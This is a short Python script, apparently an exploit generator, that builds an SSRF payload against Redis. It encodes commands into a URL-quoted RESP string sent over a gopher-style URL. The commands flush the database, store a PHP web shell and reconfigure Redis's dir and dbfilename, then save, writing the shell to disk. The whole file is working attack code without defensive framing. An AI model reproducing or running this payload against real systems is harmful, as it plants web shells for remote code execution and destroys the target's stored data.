from urllib.parse import quote
import configparser

"""
global variabls
"""
config = configparser.ConfigParser()
config.read("conf/default.ini")
protocol = config['common']['protocol']
host = config['common']['host']
port = config['common']['port']
shell = config['shell']['phpshell']
filename = config['redis']['dbfilename']
path = config['redis']['path']
cmd = ["flushall",
      r"""set shell %s"""%(shell.replace(" ", "{IFS}")),
      "config set dir %s"%(path),
      "config set dbfilename %s"%(filename),
      "save"]

class redisEXP():
  def __init__(self):
    self.cmd = cmd
  def shift_to_redis_format(self):
    CRLF = "\r\n"
    item_arr = []
    exp = ""
    for item in self.cmd:
      item_arr = item.split(" ")
      exp += "*%d"%(len(item_arr))
      exp += CRLF
      for num in item_arr:
        if "{IFS}" in num:
          num = num.replace("{IFS}"," ")
        exp += "$%d"%(len(num))
        exp += CRLF
        exp += num
        exp += CRLF
    return exp

  def exploit(self):
    payload = protocol+host+":"+port+"/_"
    exp = self.shift_to_redis_format()
    payload += quote(exp)
    return payload